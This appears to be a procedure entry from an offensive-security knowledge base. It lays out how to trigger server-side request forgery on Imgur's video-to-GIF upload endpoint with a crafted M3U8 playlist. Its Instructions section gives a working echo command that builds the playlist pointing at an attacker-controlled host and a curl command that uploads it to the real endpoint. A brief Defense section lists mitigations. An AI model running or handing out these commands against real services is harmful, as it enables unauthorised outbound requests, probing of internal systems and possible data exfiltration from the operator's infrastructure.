---
tags:
  - ssrf
  - m3u8
  - upload
type: procedure
tools:
  - '[[tools/Lavf-55.48.100]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/upload-m3u8-for-ssrf]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:08:48.238Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 5f187482-5450-4d9d-b8e7-034e43a78a65
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Trigger-SSRF-with-M3U8-Upload

## Summary

This procedure uploads a specially crafted M3U8 playlist to Imgur's /vidgif/upload endpoint, exploiting Lavf/55.48.100 to trigger SSRF by forcing the server to fetch arbitrary external URLs during video to GIF conversion.

## Description

The Imgur video to GIF converter processes uploaded M3U8 files using Lavf/55.48.100 with network options enabled, allowing unvalidated URLs in playlists to cause outbound HTTP requests. This enables SSRF to internal services or external resources, potentially leading to data exfiltration or further attacks. Prerequisites include access to a controlled domain for logging requests and basic HTTP upload capabilities.

## Requirements

1. Access to Imgur's public /vidgif/upload endpoint
2. A controlled web server (e.g., yngwie.ru) to log incoming SSRF requests
3. Tools to craft and upload M3U8 files (e.g., curl)

## Defense

Defensive measures and detection strategies:

- Disable network protocol support in media processing libraries like Lavf
- Validate and sanitize all URLs in uploaded playlists, blocking file:// and internal IPs
- Monitor outbound traffic from media processing services for anomalous requests

## Objectives

1. Force server to make arbitrary HTTP GET requests
2. Confirm SSRF via external log monitoring
3. Lay groundwork for internal resource access

## Instructions

### Step 1: Craft the M3U8 Playlist

**Context**: Create a playlist that includes external URLs to trigger fetches.

**Command** ([[commands/craft-m3u8-ssrf]]):
```bash
echo -e "#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:10.0,\nhttp://yngwie.ru/2.mp4\n#EXT-X-ENDLIST" > crafted.m3u8
```

> This generates an M3U8 file pointing to an external MP4, which Lavf will fetch upon processing.

### Step 2: Upload the Playlist

**Context**: Submit the crafted file to the vulnerable endpoint to initiate processing.

**Command** ([[commands/upload-m3u8-for-ssrf]]):
```bash
curl -X POST https://imgur.com/vidgif/upload -F "file=@crafted.m3u8" -d "source=http://yngwie.ru/1.mp4&url=http://yngwie.ru/1.mp4&start=0.08&stop=5.12"
```

> The server processes the M3U8, making GET requests to listed URLs. Expected output: 200 OK from upload, with processing logs showing fetches.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/upload-m3u8-for-ssrf]]
- [[commands/craft-m3u8-ssrf]]

## Tools Used

- [[tools/Lavf-55.48.100]]

## Tags

- ssrf
- m3u8
- upload
